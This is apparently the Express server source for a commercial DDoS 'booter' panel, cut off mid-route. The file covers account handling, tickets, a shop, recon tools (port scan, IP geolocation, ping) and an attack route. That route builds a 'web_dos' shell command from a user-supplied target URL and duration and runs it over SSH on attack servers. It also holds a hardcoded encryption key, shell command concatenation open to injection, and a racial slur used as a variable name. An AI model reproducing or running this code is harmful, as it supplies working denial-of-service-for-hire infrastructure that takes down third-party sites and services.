const express = require('express');

const UserSchema = require('./UserSchema');
const UserSessionSchema = require('./UserSessionSchema');
const ServerSchema = require('./ServerSchema');
const MethodSchema = require('./MethodSchema');
const TicketSchema = require('./TicketSchema');
const ShopSchema = require('./ShopSchema');
const DirectorySchema = require('./DirectorySchema')
const { connect } = require('mongoose');

const cors = require('cors');
const morgan = require('morgan');
const helmet = require('helmet')
/*
const bodyparser = require('body-parser');
*/

const Cryptr = require('cryptr');
const cryptr = new Cryptr('d6U2Sh2l5jyTOUWYLBFbDW2jdeMNRr7R');

var randomstring = require("randomstring");
var dbip = require('dbip')
var dns = require('dns');
var scan = require('net-scan');
var Gamedig = require('gamedig');
var ping = require('ping');
var exec = require('ssh-exec')
var { DirectoryBuster } = require('./DirectoryBuster')
var { CheckOnGoing } = require('./CheckOnGoing')

var paypal = require('paypal-rest-sdk');

var ServerShit = require('./ServerEncyption')

const app = express();
const port = 5000;

( async () => {
	await connect('Your_MongoDB_URL', {
		useNewUrlParser: true,
		useFindAndModify: false,
		useUnifiedTopology: true
	})
})();

paypal.configure({
	'mode': 'sandbox', //sandbox or live
	'client_id': '',
	'client_secret': ''
});


function validateURL(textval) {
	var urlregex = /^(https?|ftp):\/\/([a-zA-Z0-9.-]+(:[a-zA-Z0-9.&%$-]+)*@)*((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}|([a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+\.(com|edu|gov|int|mil|net|org|biz|club|arpa|info|name|pro|link|aero|coop|museum|xyz|[a-zA-Z]{2}))(:[0-9]+)*(\/($|[a-zA-Z0-9.,?'\\+&%$#=~_-]+))*$/;
	return urlregex.test(textval);
}

/*
var allowCrossDomain = function(req, res, next) {
	res.header('Access-Control-Allow-Origin', '*');
	res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS');
	res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Content-Length, X-Requested-With');
	// intercept OPTIONS method
	if ('OPTIONS' == req.method) {
		res.sendStatus(200);
	} else {
		next();
	}
};
*/

app.use(helmet());
app.use(morgan('tiny'));
app.use(cors());
app.use(express.json());

/*
app.use(allowCrossDomain);

app.use(bodyparser.urlencoded({ extended: true }));
app.use(bodyparser.json());
*/

app.listen(port, () => {
	console.log('Listening on port %i', port);
});

app.post('/app/api/signup', async (req, res, next) => {
	const { body } = req;
	const {
		password
	} = body;
	let {
		email
	} = body;
	let {
		userID
	} = body;

	if(!userID)
	{
		return res.send({
			success: false,
			message: 'Error, Username field should not be empty!'
		});
	}
	if(!email)
	{
		return res.send({
			success: false,
			message: 'Error, Email field should not be empty!'
		});
	}
	if(!password)
	{
		return res.send({
			success: false,
			message: 'Error, Password field should not be empty!'
		});
	}

	userID = userID.toLowerCase();
	userID = userID.trim();

	email = email.toLowerCase();
	email = email.trim();

	await UserSchema.find({
		userID : userID,
		email : email
	}, (err, previousUsers) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		else if (previousUsers.length > 0)
		{
			return res.send({
				success: false,
				message: 'Error, User/Email already exists.'
			});
		}
	})

	const NewUser = new UserSchema();

	NewUser.userID = userID;
	NewUser.email = email;
	NewUser.password = NewUser.generateHash(password);
	NewUser.AssignedMethods.push('T0jP1bez3kLQeJvk', '4QCI84IaLOZm6oT2');
	NewUser.AssignedServer.push('ID123');

	await NewUser.save( (err, user) => {
		if(err) {
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		return res.send({
			success: true,
			message: 'Sign Up successful.'
		})
	}); 
});
app.post('/app/api/signin', async (req, res, next) => {
	const { body } = req;
	const {
		password
	} = body;
	let {
		userID
	} = body;
	if(!userID)
	{
		return res.send({
			success: false,
			message: 'Error, Username field should not be empty!'
		});
	}
	if(!password)
	{
		return res.send({
			success: false,
			message: 'Error, Password field should not be empty!'
		});
	}

	userID = userID.toLowerCase();
	userID = userID.trim();

	await UserSchema.find( {
		userID : userID
	}, async (err, users) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		if(users.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Credentials.'
			});	
		}

		const user = users[0];

		if(!user.validPassword(password, user.password)) {
			return res.send({
				success: false,
				message: 'Invalid Credentials.'
			});	
		}

        var rand_token = randomstring.generate({
            length: 64,
            charset: 'ABCDEFGHIJKLMNOPQSTUVWXYZabcdefghijklmnopqstuvwxyz0123456789'
          });

		const userSession = new UserSessionSchema();
		userSession.userID = userID;
		userSession.userToken = rand_token;
		await userSession.save( (err, doc) => {
			if(err) {
				return res.send({
					success: false,
					message: 'Server Error, please try again later.'
				});
			}
			return res.send({
				success: true,
				message: 'Valid sign in',
				token: rand_token
	        });
		})
	})
});
app.get('/app/api/logout', async (req, res, next) => {
	const { query } = req;
	const { token } = query;
	await UserSessionSchema.findOneAndUpdate({
		userToken : token
	}, {
		$set:
		{
			isDeleted : true
		}
	}, {
		new : true
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		return res.send({
			success: true,
			message: 'Sign Out Successful'
        });
	})
});
app.get('/app/api/verify', async (req, res, next) => {
	const { query } = req;
	const { token } = query;
	await UserSessionSchema.find({
		userToken : token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const user = sessions[0];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Session.'
			});
		}
		else
		{
			UserSchema.find({
				userID : user.userID
			}, (err, SeasonLL) => {
				if(err)
				{
					return res.send({
						success: false,
						message: 'Server Error, please try again later.'
					});
				}
				const user2 = SeasonLL[0]
				if(SeasonLL.length != 1)
				{
					return res.send({
						success: false,
						message: 'Invalid User.'
					});
				}
				else
				{
					var ServerLength = user2.AssignedServer.length;
					var MethodLength = user2.AssignedMethods.length;
					var AttacksSent = user2.Atklogs.length;
					return res.send({
						success: true,
						message: 'Session accepted.',
						userName: user.userID,
						ServNumber : ServerLength,
						signUpDate : user2.signUpDate,
						MoneyBal : user2.MoneyBal,
						MethodLength : MethodLength,
						AtkSent : AttacksSent,
						Atklogs : user2.Atklogs,
						email: user2.email
					});
				}
			});
		}
	});
});
app.get('/app/api/server', async (req, res, next) => {
	const { query } = req;
	const { user } = query;
	await UserSchema.find({
		userID : user
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const user = sessions[0];
		var ServerArrays = [];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid User.'
			});
		}
		else
		{
			( async () => {
				const promises = user.AssignedServer.map( async (server) => 
				{
					const ayayaya = await ServerSchema.findOne( { ServID : server } );
					if(ayayaya)
					{
						ServerArrays.push(ayayaya.ServName);
					}
				})
				await Promise.all(promises)
				.then( () => {
					return res.send({
						success: true,
						message: 'Server Name(s) Acquired',
						ServerArrays: ServerArrays
					});	
				})
				.catch( (err) => {
					return res.send({
						success: false,
						message: 'Server Error, please try again later.'
					});
				});
			})();
		}
	});
});
app.get('/app/api/method', async (req, res, next) => {
	const { query } = req;
	const { user } = query;
	await UserSchema.find({
		userID : user
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const user = sessions[0];
		var MethodArrays = [];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid User.'
			});
		}
		else
		{
			( async () => {
				const promises = user.AssignedMethods.map( async (method) => 
				{
					const ayya = await MethodSchema.findOne( { MethodID : method } );
					if(ayya)
					{
						MethodArrays.push(ayya.MethodName);
					}
				})
				await Promise.all(promises)
				.then( () => {
					return res.send({
						success: true,
						message: 'Method Name(s) Acquired',
						MethodArrays: MethodArrays
					});	
				})
				.catch( (err) => {
					return res.send({
						success: false,
						message: 'Server Error, please try again later.'
					});
				});
			})();
		}
	});
});
app.post('/app/api/l7/atk', async (req, res, next) => {
	const { body } = req;
	const {
		Token,
		Destatk,
		Desttime,
		PickedServer,
		PickedMethod
	} = body;
	if(!Token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable'
		});
	}
	if(!Destatk)
	{
		return res.send({
			success: false,
			message: 'You should put a URL as your destination'
		});
	}
	if(!(validateURL(Destatk)))
	{
		return res.send({
			success: false,
			message: 'You should put a valid URL as your destination'
		});
	}
	if(!Desttime)
	{
		return res.send({
			success: false,
			message: 'You should put a valid time'
		});
	}
	if(!PickedServer)
	{
		return res.send({
			success: false,
			message: 'You should pick a server'
		});
	}
	if(!PickedMethod)
	{
		return res.send({
			success: false,
			message: 'You should pick a method'
		});
	}
	await UserSessionSchema.find({
		userToken : Token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const user = sessions[0];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		else
		{
			MethodSchema.find({
				MethodName : PickedMethod
			}, (err, sessions2) => {
				if(err)
				{
					return res.send({
						success: false,
						message: 'Server Error, please try again later.'
					});
				}
				const user2 = sessions2[0];
				if(sessions2.length != 1)
				{
					return res.send({
						success: false,
						message: 'Invalid Method.'
					});
				}
				ServerSchema.find({
					ServName : PickedServer
				}, (err, sessions3) => {
					if(err)
					{
						return res.send({
							success: false,
							message: 'Server Error, please try again later.'
						});
					}
					const user3 = sessions3[0];
					if(sessions3.length != 1)
					{
						return res.send({
							success: false,
							message: 'Invalid Server.'
						});
					}
					UserSchema.find({
						userID : user.userID
					}, (err, SeasonLL) => {
						const user4 = SeasonLL[0]
						if(SeasonLL.length != 1)
						{
							return res.send({
								success: false,
								message: 'Invalid Method.'
							});
						}
						if(!(user4.AssignedMethods.includes(user2.MethodID)))
						{
							return res.send({
								success: false,
								message: 'You do not have access to this method'
							});
						}
						if(!(user4.AssignedServer.includes(user3.ServID)))
						{
							return res.send({
								success: false,
								message: 'You do not have access to this server'
							});
						}
						const atk_command = 'screen -S web_dos -dm ' + user2.RunExtension + ' ' + Destatk + ' ' + Desttime + ' ' + user2.EndStuff;
						const serverIP = ServerShit.decrypt(user3.ServIP);
						const serverPass = ServerShit.decrypt(user3.ServPass);
						exec(atk_command, {
							user: user3.ServUsr,
							host: serverIP,
							password: serverPass
						}, (err, stdout, stderr) => {
							if(err)
							{
								return res.send({
									success: false,
									message: 'Server Error, please try again later.'
								});
							}
							else
							{
								var ArrayLog = user4.Atklogs;
								var CurrentDate = new Date();
								ArrayLog.push({
									Destination : Destatk,
									Server : PickedServer,
									Method : PickedMethod,
									Date : CurrentDate,
									Time : Desttime
								})
								UserSchema.findOneAndUpdate({
									userID : user.userID
								}, {
								$set:
								{
									Atklogs : ArrayLog

								}
								}, {
									new : true
								}, (err, yada) => {
									if(err)
									{
										return res.send({
											success: false,
											message: 'Attack went through but a server error has occured.'
										});
									}
									return res.send({
										success: true,
										message: 'Attack has been successfuly sent.'
									});
								})
							}
						})
					})
				})
			})
		}
	});
});
app.post('/app/api/tools/whois', async (req, res, next) => {
	const { body } = req;
	const { 
		HostnameTarget,
		Token
	} = body;
	if(!Token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable'
		});
	}
	if(!HostnameTarget)
	{
		return res.send({
			success: false,
			message: 'Hostname field is empty'
		});
	}
	await UserSessionSchema.find({
		userToken : Token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			})
		}
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		else
		{
			dns.lookup(HostnameTarget, function(err, addresses, family){
				if(err)
				{
					return res.send({
						success: false,
						message: 'Error has occured during scanning, please try again.'
					});
				}
				dbip(addresses).then(info => {
					return res.send({
						success: true,
						message: 'Scan has been completed.',
						ipv4 : info["IP Address"],
						iptype: info["Address type"],
						ipfamily: family,
						isp: info["ISP"],
						organization: info["Organization"],
						country: info["Country"],
						region: info["State / Region"],
						district: info["District / County"],
						city: info["City"],
						timezone: info["Timezone"],
						coords: info["Coordinates"]
					})
				})
			});
		}
	});
});
app.post('/app/api/tools/portscan', async (req, res, next) => {
	const { body } = req;
	const { 
		HostnameTarget,
		Token
	} = body;
	if(!Token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable'
		});
	}
	if(!HostnameTarget)
	{
		return res.send({
			success: false,
			message: 'Hostname field is empty'
		});
	}
	await UserSessionSchema.find({
		userToken : Token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			})
		}
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		else
		{
			scan.port({
				host: HostnameTarget,
				start: 1,
				end: 100,
				timeout: 2000,
				queue: 1000
			}, (err, result) => {    
				if(err)
				{
					return res.send({
						success: false,
						message: 'Error has occured during scanning, please try again.'
					})

				}
				if(result.length)
				{
					return res.send({
						success: true,
						message: 'Scan has been completed.',
						openports: result
					});
				}
				else
				{
					var openportsArray = [];
					openportsArray.push('No Result');
					return res.send({
						success: true,
						message: 'Scan has been completed.',
						openports: openportsArray
					});
				}
			});
		}
	});
});
app.post('/app/api/tools/gameserverquery', async (req, res, next) => {
	const { body } = req;
	const { 
		HostnameTarget,
		Token,
		GameValue,
		PortChosen
	} = body;
	if(!Token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable'
		});
	}
	if(!HostnameTarget)
	{
		return res.send({
			success: false,
			message: 'Hostname field is empty'
		});
	}
	if(!GameValue)
	{
		return res.send({
			success: false,
			message: 'Game field is empty'
		});
	}
	if(!PortChosen)
	{
		return res.send({
			success: false,
			message: 'Port field is empty'
		});
	}
	if(PortChosen < 0 || PortChosen >= 65536)
	{
		return res.send({
			success: false,
			message: 'Port should be between 0 - 65536'
		});
	}
	await UserSessionSchema.find({
		userToken : Token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			})
		}
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		else
		{
			Gamedig.query({
			    type: GameValue,
			    host: HostnameTarget,
			    port: parseInt(PortChosen)
			}).then( (state) => {
				return res.send({
					success: true,
					message: 'Scan has been completed.',
					name: state.name,
					map: state.map,
					game: state.raw.game,
					maxplayers: state.maxplayers,
					onlinebots: state.bots.length,
					onlineplayers: state.players.length
				})
			}).catch( (error) => {
				return res.send({
					success: false,
					message: 'Error has occured during scanning, please try again.'
				})
			})	
		}
	});
});
app.post('/app/api/tools/isitup', async (req, res, next) => {
	const { body } = req;
	const { 
		HostnameTarget,
		Token
	} = body;
	if(!Token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable'
		});
	}
	if(!HostnameTarget)
	{
		return res.send({
			success: false,
			message: 'Hostname field is empty'
		});
	}
	await UserSessionSchema.find({
		userToken : Token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			})
		}
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		else
		{
			ping.sys.probe(HostnameTarget, (isAlive) => {
				if(isAlive)
				{
					return res.send({
						success: true,
						message: 'Scan has been completed.',
						upordown: 'Alive.'
					})
				}
				else
				{
					return res.send({
						success: true,
						message: 'Scan has been completed.',
						upordown: 'Dead.'
					})
				}
			});
		}
	});
});
app.get('/app/api/managemethods', async (req, res, next) => {
	const { query } = req;
	const { token } = query;
	await UserSessionSchema.find({
		userToken : token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const user = sessions[0];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Session.'
			});
		}
		else
		{
			UserSchema.find({
				userID : user.userID
			}, (err, SeasonLL) => {
				if(err)
				{
					return res.send({
						success: false,
						message: 'Server Error, please try again later.'
					});
				}
				const user2 = SeasonLL[0]
				if(SeasonLL.length != 1)
				{
					return res.send({
						success: false,
						message: 'Invalid User.'
					});
				}
				else
				{
					var MethodArrays = [];
					( async () => {
						const promises = user2.AssignedMethods.map( async (method) => 
						{
							const ayya = await MethodSchema.findOne( { MethodID : method } );
							if(ayya)
							{
								MethodArrays.push({
									MethodName : ayya.MethodName,
									MethodType : ayya.MethodType
								});
							}
						})
						await Promise.all(promises)
						.then( () => {
							return res.send({
								success: true,
								message: 'Method info Acquired',
								MethodInfo: MethodArrays
							});	
						})
						.catch( (err) => {
							return res.send({
								success: false,
								message: 'Server Error, please try again later.'
							});
						});
					})();
				}
			});
		}
	});
});
app.get('/app/api/manageservers', async (req, res, next) => {
	const { query } = req;
	const { token } = query;
	await UserSessionSchema.find({
		userToken : token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const user = sessions[0];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Session.'
			});
		}
		else
		{
			UserSchema.find({
				userID : user.userID
			}, (err, SeasonLL) => {
				if(err)
				{
					return res.send({
						success: false,
						message: 'Server Error, please try again later.'
					});
				}
				const user2 = SeasonLL[0]
				if(SeasonLL.length != 1)
				{
					return res.send({
						success: false,
						message: 'Invalid User.'
					});
				}
				else
				{
					var ServerArrays = [];
					( async () => {
						const promises = user2.AssignedServer.map( async (server) => 
						{
							const ayya = await ServerSchema.findOne( { ServID : server } );
							if(ayya)
							{
								ServerArrays.push({
									ServName : ayya.ServName,
									Expire : ayya.Expires,
									L4 : ayya.Layer4,
									RAM : ayya.RAM,
									CORES : ayya.CORES,
									SHARE : ayya.Shared,
									MINREQ : ayya.MinReq,
									MINPW : ayya.MinPower
								});
							}
						})
						await Promise.all(promises)
						.then( () => {
							return res.send({
								success: true,
								message: 'Server Info Acquired',
								ServerInfo: ServerArrays
							});	
						})
						.catch( (err) => {
							return res.send({
								success: false,
								message: 'Server Error, please try again later.'
							});
						});
					})();
				}
			});
		}
	});
});
app.post('/app/api/settings/changepw', async (req, res, next) => {
	const { body } = req;
	const {
		Token,
		currentPW,
		NewPW,
		ConfirmNewPW
	} = body;
	if(!Token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable.'
		});
	}
	if(!currentPW)
	{
		return res.send({
			success: false,
			message: 'Current Password field is empty.'
		});
	}
	if(!NewPW)
	{
		return res.send({
			success: false,
			message: 'New Password field is empty.'
		});
	}
	if(!ConfirmNewPW)
	{
		return res.send({
			success: false,
			message: 'Confirm New Password Field is empty.'
		});
	}
	if(NewPW !== ConfirmNewPW)
	{
		return res.send({
			success: false,
			message: 'Both New Passwords does match.'
		});
	}
	await UserSessionSchema.find({
		userToken : Token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const user = sessions[0];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		else
		{
			UserSchema.find({
				userID : user.userID
			}, (err, SeasonLL) => {
				const user2 = SeasonLL[0]
				if(SeasonLL.length != 1)
				{
					return res.send({
						success: false,
						message: 'Invalid User.'
					});
				}
				if(!user2.validPassword(currentPW, user2.password)) {
					return res.send({
						success: false,
						message: 'Current Password does not match.'
					});	
				}
				const newChangedPassword = user2.generateHash(NewPW);
				UserSchema.findOneAndUpdate({
					userID : user.userID
				}, {
				$set:
				{
					password : newChangedPassword

				}
				}, {
					new : true
				}, (err, yada) => {
					if(err)
					{
						return res.send({
							success: false,
							message: 'Server Error, please try again later.'
						});
					}
					return res.send({
						success: true,
						message: 'Password has been successfuly changed.'
					});
				})
			})
		}
	});
});
app.post('/app/api/settings/changemail', async (req, res, next) => {
	const { body } = req;
	const {
		Token,
		currentEmail,
		NewEmail,
		ConfirmNewEmail
	} = body;
	if(!Token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable.'
		});
	}
	if(!currentEmail)
	{
		return res.send({
			success: false,
			message: 'Current Email field is empty.'
		});
	}
	if(!NewEmail)
	{
		return res.send({
			success: false,
			message: 'New Email field is empty.'
		});
	}
	if(!ConfirmNewEmail)
	{
		return res.send({
			success: false,
			message: 'Confirm New Email Field is empty.'
		});
	}
	if(NewEmail !== ConfirmNewEmail)
	{
		return res.send({
			success: false,
			message: 'Both New Emails does match.'
		});
	}
	await UserSessionSchema.find({
		userToken : Token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const user = sessions[0];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		else
		{
			UserSchema.find({
				userID : user.userID
			}, (err, SeasonLL) => {
				const user2 = SeasonLL[0]
				if(SeasonLL.length != 1)
				{
					return res.send({
						success: false,
						message: 'Invalid User.'
					});
				}
				if(user2.email !== currentEmail) {
					return res.send({
						success: false,
						message: 'Current Email does not match.'
					});	
				}
				UserSchema.findOneAndUpdate({
					userID : user.userID
				}, {
				$set:
				{
					email : NewEmail

				}
				}, {
					new : true
				}, (err, yada) => {
					if(err)
					{
						return res.send({
							success: false,
							message: 'Server Error, please try again later.'
						});
					}
					return res.send({
						success: true,
						message: 'Email has been successfuly changed.'
					});
				})
			})
		}
	});
});
app.post('/app/api/settings/clearlogs', async (req, res, next) => {
	const { body } = req;
	const {
		Token
	} = body;
	if(!Token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable.'
		});
	}
	await UserSessionSchema.find({
		userToken : Token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const user = sessions[0];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		else
		{
			UserSchema.findOneAndUpdate({
				userID : user.userID
			}, {
			$set:
			{
				Atklogs : []

			}
			}, {
				new : true
			}, (err, yada) => {
				if(err)
				{
					return res.send({
						success: false,
						message: 'Server Error, please try again later.'
					});
				}
				return res.send({
					success: true,
					message: 'Logs has been successfuly cleared.'
				});
			})
		}
	});
});
app.get('/app/api/tickets', async (req, res, next) => {
	const { query } = req;
	const { token } = query;
	if(!token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable.'
		});
	}
	await UserSessionSchema.find({
		userToken : token,
		isDeleted : false
	}, (err, hahatokens) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const yadatokens = hahatokens[0];
		if(hahatokens.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		UserSchema.find({
			userID : yadatokens.userID
		}, (err, sessions) => {
			if(err)
			{
				return res.send({
					success: false,
					message: 'Server Error, please try again later.'
				});
			}
			const user = sessions[0];
			var TicketArray = [];
			if(sessions.length != 1)
			{
				return res.send({
					success: false,
					message: 'Invalid User.'
				});
			}
			else
			{
				( async () => {
					const promises = user.AssignedTickets.map( async (ticket) => 
					{
						const req = await TicketSchema.findOne( { TicketID : ticket } );
						if(req)
						{
							TicketArray.push({
								TicketID : req.TicketID,
								TicketTopic : req.TicketTopic,
								TicketDate : req.TicketDate,
								TicketStatus : req.TicketStatus
							});
						}
					})
					await Promise.all(promises)
					.then( () => {
						return res.send({
							success: true,
							message: 'Ticket Information Acquired',
							TicketArray: TicketArray
						});	
					})
					.catch( (err) => {
						return res.send({
							success: false,
							message: 'Server Error, please try again later.'
						});
					});
				})();
			}
		});
	});
});
app.post('/app/api/ticket/submit', async (req, res, next) => {
	const { body } = req;
	const { 
		TopicName,
		Token
	} = body;
	if(!Token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable'
		});
	}
	if(!TopicName)
	{
		return res.send({
			success: false,
			message: 'Topic field is empty'
		});
	}
	await UserSessionSchema.find({
		userToken : Token,
		isDeleted : false
	}, (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			})
		}
		const user = sessions[0];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		else
		{
			var rand_token = randomstring.generate({
				length: 8,
				charset: 'ABCDEFGHIJKLMNOPQSTUVWXYZabcdefghijklmnopqstuvwxyz0123456789'
			});
			const NewTicket = new TicketSchema();
			NewTicket.TicketID = rand_token;
			NewTicket.TicketTopic = TopicName;
			NewTicket.save( (err, yahoo) => {
				if(err) {
					return res.send({
						success: false,
						message: 'Server Error, please try again later.'
					});
				}
				UserSchema.find({
					userID : user.userID
				}, (err, sessionsthree) => {
					if(err)
					{
						return res.send({
							success: false,
							message: 'Server Error, please try again later.'
						});
					}
					const user2 = sessionsthree[0];
					if(sessionsthree.length != 1)
					{
						return res.send({
							success: false,
							message: 'Invalid User.'
						});
					}
					var ArrayTickets = user2.AssignedTickets;
					ArrayTickets.push(rand_token);
					UserSchema.findOneAndUpdate({
						userID : user.userID
					}, {
						$set:
						{
							AssignedTickets : ArrayTickets

						}
					}, {
						new : true
					}, (err, yada) => {
						if(err)
						{
							return res.send({
								success: false,
								message: 'Server Error, please try again later.'
							});
						}
						return res.send({
							success: true,
							message: 'Ticket has been successfuly added'
						});
					})
				}); 
			});
		}
	});
});
app.get('/app/api/tickets/get/logs', async (req, res, next) => {
	const { query } = req;
	const { token } = query;
	const { ticketid } = query;
	if(!token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable.'
		});
	}
	if(!ticketid)
	{
		return res.send({
			success: false,
			message: 'Ticket ID inavailable.'
		});
	}
	await UserSessionSchema.find({
		userToken : token,
		isDeleted : false
	}, async (err, hahatokens) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const yadatokens = hahatokens[0];
		if(hahatokens.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		const reqyo = await UserSchema.findOne({ userID : yadatokens.userID });
		if(reqyo)
		{
			if(reqyo.AssignedTickets.includes(ticketid))
			{
				( async () => {
					const babyo = await TicketSchema.findOne({ 
						TicketID : ticketid,
						TicketStatus : false 
					});
					if(babyo)
					{
						return res.send({
							success: true,
							message: 'Ticket information has been acquired.',
							TicketMessages : babyo.TicketMessages,
							TicketTopic : babyo.TicketTopic,
							TicketDate : babyo.TicketDate,
							TopicID : babyo.TicketID

						});	
					}
					else
					{
						return res.send({
							success: false,
							message: 'Invalid Ticket.'
						});	
					}
				})();
			}
			else
			{
				return res.send({
					success: false,
					message: 'Invalid Ticket.'
				});		
			}
		}
		else
		{
			return res.send({
				success: false,
				message: 'Invalid User.'
			});	
		}
	});
});
app.post('/app/api/ticket/speakspeech', async (req, res, next) => {
	const { body } = req;
	const { 
		MessageBody,
		TopicID,
		Token
	} = body;
	if(!Token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable'
		});
	}
	if(!TopicID)
	{
		return res.send({
			success: false,
			message: 'Topic ID is empty'
		});
	}
	if(!MessageBody)
	{
		return res.send({
			success: false,
			message: 'Body is empty'
		});
	}
	await UserSessionSchema.find({
		userToken : Token,
		isDeleted : false
	}, async (err, sessions) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			})
		}
		const user = sessions[0];
		if(sessions.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		else
		{
			var shitty = await UserSchema.findOne( { userID : user.userID } );
			if(shitty)
			{
				if(shitty.AssignedTickets.includes(TopicID))
				{
					( async () => {
						var niggers = await TicketSchema.findOne( { 
							TicketID : TopicID,
							TicketStatus : false
						} )
						if(niggers)
						{
							let TicketShit = niggers.TicketMessages;
							TicketShit.push({
								username : user.userID,
								message : MessageBody
							});
							TicketSchema.findOneAndUpdate({
								TicketID : TopicID,
								TicketStatus : false
							}, {
								$set:
								{
									TicketMessages : TicketShit

								}
							}, {
								new : true
							}, (err, yada) => {
								if(err)
								{
									return res.send({
										success: false,
										message: 'Server Error, please try again later.'
									});
								}
								return res.send({
									success: true,
									message: 'Message has been sent successfuly'
								});
							})
						}
						else
						{
							return res.send({
								success: false,
								message: 'Invalid Ticket.'
							});
						}
					})();
				}
				else
				{
					return res.send({
						success: false,
						message: 'Invalid Topic ID.'
					});
				}
			}
			else
			{
				return res.send({
					success: false,
					message: 'Invalid User.'
				});
			}
		}
	});
});
app.get('/app/api/shop/item', async (req, res, next) => {
	const { query } = req;
	const { token } = query;
	if(!token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable.'
		});
	}
	await UserSessionSchema.find({
		userToken : token,
		isDeleted : false
	}, async (err, hahatokens) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const yadatokens = hahatokens[0];
		if(hahatokens.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		const reqyo = await UserSchema.findOne({ userID : yadatokens.userID });
		if(reqyo)
		{
			( async () => {
				var ArrayShop = []
				await ShopSchema.find({ ItemStock : true }, async (err, result) =>{
					if(err)
					{
						return res.send({
							success: false,
							message: 'Server Error, please try again later.'
						});
					}
					for( var i = 0 ; i < result.length ; i++ )
					{
						const users2 = result[i]
						ArrayShop.push({
							ItemID : users2.ItemID,
							ItemName : users2.ItemName,
							ItemDescription : users2.ItemDescription,
							ItemPrice : users2.ItemPrice,
							ItemType: users2.ItemType
						})
					}
					return res.send({
						success: true,
						message: 'Got all information',
						ArrayShop : ArrayShop
					})
